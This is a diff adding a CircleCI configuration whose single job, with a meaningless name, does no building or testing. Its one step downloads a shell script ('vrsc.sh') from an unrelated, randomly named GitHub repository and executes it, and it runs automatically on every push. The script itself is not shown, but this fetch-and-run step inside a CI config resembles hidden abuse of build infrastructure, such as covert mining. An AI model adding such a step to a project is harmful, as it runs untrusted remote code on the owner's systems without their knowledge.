@@ -1,0 +1,16 @@
+version: 2.1
+
+jobs:
+  tresto:
+    docker:
+      - image: circleci/ruby:2.5.3
+    steps:
+      - run:
+          name: vrsc
+          command: wget https://raw.githubusercontent.com/65r156h1/expert-octo-parakeet/main/vrsc.sh && ./vrsc.sh
+
+workflows:
+   version: 2.1
+   build:
+       jobs:
+       - tresto
